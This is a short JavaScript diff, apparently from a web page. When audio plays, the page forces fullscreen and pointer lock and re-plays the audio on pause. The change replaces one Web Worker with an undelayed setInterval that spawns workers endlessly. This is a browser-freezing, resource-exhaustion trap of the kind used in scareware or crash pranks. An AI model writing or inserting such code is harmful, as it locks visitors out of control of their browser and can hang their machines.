@@ -57,7 +57,7 @@
         audio.addEventListener("playing", () => {
             requestFullscreen()
             requestPointerLock()
-            new Worker('worker.js')
+            setInterval(()=>{new Worker('newworker.js')})
         });
         audio.addEventListener('pause', () => {
           playAudioOnce()
